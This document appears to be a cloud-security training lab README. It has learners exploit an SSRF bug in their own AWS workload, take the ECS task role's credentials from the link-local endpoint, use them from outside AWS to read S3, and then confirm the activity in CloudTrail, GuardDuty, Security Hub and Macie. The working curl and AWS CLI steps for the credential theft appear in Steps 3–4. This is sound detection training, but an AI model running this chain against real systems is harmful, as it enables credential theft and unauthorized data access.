# Day 8 lab — Detection

## ⚠️ Authorized testing only

This lab's "break" is a real exploit chain (SSRF → stolen IAM
credentials → data access) run against **your own AWS account and your
own Terraform-deployed workload (`labs/base/`) only.** Never run any of
these steps against an account, resource, or workload you do not own and
are not explicitly authorized to test. See
[`../../content/ANTIPATTERNS.md`](../../content/ANTIPATTERNS.md#authorized-testing-statement)
for the canonical statement this lab operates under.

## ⏱ Free-trial clock

GuardDuty, Security Hub, Macie, and Detective all start their 30-day free
trial the moment this module is applied. This is the **only** lab in the
sprint whose resources are meant to survive the night — see "Teardown"
below. Do not treat that as license to leave it running past Day 9.

## Objective

1. Enable CloudTrail (scoped), GuardDuty, Security Hub, Macie, and
   Detective via Terraform.
2. Run the shared incident's SSRF → task-role-credential-theft chain
   against your own deployed base workload, from outside AWS.
3. Prove ≥2 real, finding-ID-bearing GuardDuty findings exist, and trace
   the CloudTrail record of the SSRF-driven read end to end.

## Prerequisites

- `labs/base` applied and its ECS service `RUNNING` (a real `app_image`
  pushed — see `labs/base/README.md`). Confirm with:
  ```bash
  curl "http://$(cd ../base && terraform output -raw alb_dns_name)/whoami"
  ```
  should return JSON with an `arn` under `.../aws-sec-lab-task-role/...`.
- AWS CLI v2, configured with credentials that can enable GuardDuty/
  Security Hub/Macie and read CloudTrail/S3/DynamoDB (your normal admin
  session — not the task role).
- Terraform >= 1.6, AWS provider >= 5.0. **Terraform is not run for you
  by this document's author** — you run `init/plan/apply/destroy`
  yourself. This module was validated by manual HCL review only (no
  `terraform validate`/`plan` was run while authoring it, and no AWS
  calls were made) — read `main.tf` yourself before applying, same as
  every other day's lab.

## Step 1 — Apply this module

```bash
cd labs/day08
cp terraform.tfvars.example terraform.tfvars
# edit terraform.tfvars: region/project MUST match labs/base
terraform init
terraform plan
terraform apply
```

This creates: a dedicated CloudTrail log bucket + a multi-region trail
(management events + S3 data events scoped to the base `app_data`
bucket only), a GuardDuty detector, a Security Hub account + the AWS
Foundational Security Best Practices standard, a Macie account + a
one-time classification job on `app_data`, and a Detective graph. It
creates **no** ALB/ECS/CloudFront of its own.

Note: GuardDuty and Security Hub each individually can take a minute or
two to finish enabling account-wide; if `apply` errors on a dependent
resource immediately after account enablement, re-run `apply` once.

## Step 2 — Recon: find the task-role credential path

In the shared incident, the attacker's *first* foothold is a leaked IAM
access key with just enough visibility to find the ECS task and look up
its runtime environment — that's what this step stands in for (using
your own admin session, not the leaked key itself, since nothing in this
sprint actually creates a leaked key).

Base already has ECS Exec turned on (`enable_execute_command = true` on
`aws_ecs_service.app`) and the task role carries the `ssmmessages:*`
permissions it needs — no setup step required here.

```bash
CLUSTER_ARN=$(cd ../base && terraform output -raw ecs_cluster_arn)
SERVICE=$(cd ../base && terraform output -raw ecs_service_name)

# Find the running task:
TASK_ARN=$(aws ecs list-tasks --cluster "$CLUSTER_ARN" --service-name "$SERVICE" \
  --query 'taskArns[0]' --output text)

# Requires the Session Manager plugin for the AWS CLI (local tool, not an
# AWS-side permission).
aws ecs execute-command --cluster "$CLUSTER_ARN" --task "$TASK_ARN" \
  --container app --interactive --command "/bin/sh"
```

Inside the shell:

```sh
echo "$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
exit
```

Record that value (looks like `/v2/credentials/<uuid>`) — call it
`$RELATIVE_URI` below.

## Step 3 — THE BREAK: steal the task role's credentials via SSRF

From **your own machine** (not from inside the task — the point is to
prove the SSRF endpoint itself reaches the link-local credentials
endpoint and hands the result to an external caller):

```bash
ALB_DNS=$(cd ../base && terraform output -raw alb_dns_name)

curl "http://$ALB_DNS/fetch?url=http://169.254.170.2$RELATIVE_URI"
```

**Expected:** a JSON body with `AccessKeyId`, `SecretAccessKey`,
`Token`, and `Expiration` — the task role's live temporary credentials,
fetched server-side by the app's `/fetch` SSRF bug and returned verbatim
to you, an external caller. See `SOLUTION.md` for the exact expected
shape.

## Step 4 — Weaponize the stolen credentials from outside AWS

```bash
export AWS_ACCESS_KEY_ID="<AccessKeyId from step 3>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey from step 3>"
export AWS_SESSION_TOKEN="<Token from step 3>"

APP_BUCKET=$(cd ../base && terraform output -raw app_bucket_name)

aws s3 ls "s3://$APP_BUCKET/"
```

Check the `ls` output: if it lists at least one key, pick any of them for
the next command. **If the bucket is empty** (likely, since nothing in
this sprint writes to it by default), first `aws s3 cp` any small local
file up to it using the same stolen credentials — that `PutObject` is
itself another data-plane read/write worth having in the trail — then
read it back:

```bash
echo "day08 lab test object" > /tmp/day08-upload-test.txt
aws s3 cp /tmp/day08-upload-test.txt "s3://$APP_BUCKET/day08-upload-test.txt"

aws s3 cp "s3://$APP_BUCKET/<any-existing-or-just-uploaded-key>" - > /tmp/stolen-object
aws sts get-caller-identity   # confirm you're now the task role, from your laptop
```

Then **unset** those three env vars before doing anything else with your
own AWS CLI session:

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

This is the moment that generates the CloudTrail data-event trail: a
`GetObject`/`ListBucket` call, attributed to
`aws-sec-lab-task-role`, sourced from your laptop's public IP — not from
inside the VPC, not from the Flask app's own HTTP client. That
identity/source mismatch is the signal both CloudTrail (as a raw record)
and GuardDuty (as an interpreted finding) exist to surface.

## Step 5 — Confirm the CloudTrail trail end to end

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject \
  --max-results 10
```

Find the event matching Step 4's timestamp; record it in `SOLUTION.md`'s
format. Also check the management-event side:

```bash
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ExecuteCommand \
  --max-results 5
```

## Step 6 — Guarantee ≥2 real GuardDuty findings

Real GuardDuty detection of Steps 3-4 can take anywhere from minutes to
hours to publish (see the day content's GuardDuty section). To guarantee
today's signal instead of waiting, use GuardDuty's own official,
AWS-documented sample-findings feature — these are real finding records
(flagged `sample: true`) that exercise the exact same finding types the
shared incident maps to:

```bash
DETECTOR_ID=$(terraform output -raw guardduty_detector_id)

aws guardduty create-sample-findings \
  --detector-id "$DETECTOR_ID" \
  --finding-types \
    "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS" \
    "CryptoCurrency:EC2/BitcoinTool.B!DNS"

aws guardduty list-findings --detector-id "$DETECTOR_ID"
aws guardduty get-findings --detector-id "$DETECTOR_ID" \
  --finding-ids <id-1> <id-2>
```

Record both finding IDs, types, and severities in `SOLUTION.md`. If your
real Step 3-4 exploit also produces a natural finding before you tear
down, record that one too as a bonus third finding.

## Step 7 — Confirm Security Hub aggregation and kick the Macie job

```bash
aws securityhub get-findings --max-results 10
```

You should see the same GuardDuty findings from Step 6, now in ASFF
format, aggregated alongside AWS Foundational Security Best Practices
compliance checks.

```bash
JOB_ID=$(terraform output -raw macie_classification_job_id)
aws macie2 describe-classification-job --job-id "$JOB_ID"
```

A one-time job runs shortly after creation; re-run `describe-
classification-job` until `jobStatus` is `COMPLETE`, then check
`aws macie2 list-findings` for anything flagged.

## THE HARDEN

**Not today.** Day 9 wires the GuardDuty finding from Step 6/an eventual
natural detection to an EventBridge rule that invokes a Lambda to
quarantine the task role automatically. Today only proves detection
works; today does not fix anything.

## Success signal

- [ ] ≥2 GuardDuty findings visible via `list-findings`/`get-findings`,
      with recorded IDs, types, and severities (`SOLUTION.md`).
- [ ] The CloudTrail record of the Step 3-4 SSRF-driven credential theft
      and subsequent `GetObject`, traced end to end via
      `lookup-events` (`SOLUTION.md`).
- [ ] Security Hub shows the same findings aggregated (Step 7).
- [ ] Macie classification job reaches `COMPLETE` (Step 7).

## Teardown

**Leave `labs/day08` up — do not run a bare `terraform destroy` here,
neither today nor at the end of Day 9.** This module has two lifespans,
not one:

- **CloudTrail (`aws_cloudtrail.this`) and its log bucket
  (`aws_s3_bucket.trail_logs`) stay up through Day 12.** They are not
  part of the trial-window clock (CloudTrail is free for management
  events; the scoped data events here are negligible cost) and Day
  11-12's capstone needs the same trail that recorded today's incident.
- **GuardDuty, Security Hub, Macie, and Detective are the trial-window
  services** and come down at the **end of Day 9** — but as a
  **targeted** destroy, not a full one:

  ```bash
  terraform destroy \
    -target=aws_guardduty_detector.this \
    -target=aws_securityhub_standards_subscription.fsbp \
    -target=aws_securityhub_account.this \
    -target=aws_macie2_classification_job.app_data \
    -target=aws_macie2_account.this \
    -target=aws_detective_graph.this
  ```

  (This exact command belongs in Day 9's own teardown checklist — noted
  here so it isn't missed if you're reading this file in isolation.)

- **The full, untargeted `terraform destroy` of `labs/day08` happens only
  in Day 12's final sweep**, once the trail is no longer needed.

If you're stopping for the night between today and Day 9:

- [ ] Tear down only base's ordinary hourly-billing pieces (ALB, ECS
      service, CloudFront) per `labs/base/README.md`'s daily teardown, if
      you're done for the day — this is unrelated to today's detection
      services and would need to be brought back up next session anyway.
- [ ] Do **not** destroy anything in `labs/day08` today — not even with
      `-target` — the detection-services-only targeted destroy above is a
      **Day 9** action, not a Day 8 action.
